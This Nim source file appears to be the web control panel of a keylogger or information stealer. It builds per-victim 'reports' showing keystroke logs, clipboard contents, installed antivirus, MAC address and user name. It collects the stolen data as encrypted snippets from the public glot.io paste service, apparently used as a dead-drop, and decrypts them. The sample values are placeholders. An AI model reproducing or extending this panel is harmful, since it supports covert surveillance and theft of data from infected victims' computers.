import jester
import httpclient
import json

from random import randomize

from strutils import parseInt

import lib/components/index as index
import lib/components/clipboard as clipboard
import lib/components/header as header
import lib/components/pcname as pcname
import lib/components/infoCard as infoCard
import lib/components/av as av
import lib/components/keylog as keylog
import lib/components/devicemac as devicemac
import lib/components/displayPcs as displayPcs

randomize()

proc buildPage(id: string): string =
  result = index.render(
    pcname.render("Report #" & id & " - DESKTOP-12345") &
    #header.render("basic info") &
    infoCard.render(
      "Report Identification", [
        "Date created: 0000",
        "Date sent: 0000",
        "Client user name: abiregele",
        "samd: sal1",
      ]
    ) &
    av.render(
      "Norton"
    ) &
    av.render(
      "Windows Defender"
    ) &
    clipboard.render("nimic") &
    keylog.render("A B C D E F G H I J K L M N O P Q R T S T U V W Y X Z") &
    devicemac.render("AA:BB:CC:DD:EE:FF") # aici pt manufacturer folosesti aia oui
  )

proc getData(url: string): string =
  let client: HttpClient = newHttpClient()

  client.headers = newHttpHeaders({"Content-Type": "application/json"})

  let response = client.request(
    url,
    httpMethod = HttpGet
  )

  result = response.body

proc getSnippet(id: string): string =
  result = getData "https://snippets.glot.io/snippets/" & id

from lib/functions/parse import parseThreads
from lib/functions/parse import decryptData

proc getHeader(id: string): string =
  try:
    var data: string = decryptData parseJson(getSnippet id)["files"].getElems()[
        0]["content"].getStr

    result = parseThreads(id, data)
  except:
    result = ""

proc getSnippets(page: string): string =
  result = getData "https://snippets.glot.io/snippets?page=" & page & "&per_page=10"

routes:
  get "/":
    resp displayPcs.render()
  get "/show/@id":
    resp buildPage @"id"
  get "/getHeader/@id":
    resp getHeader @"id"
  get "/getPage/@page":
    resp getSnippets @"page"
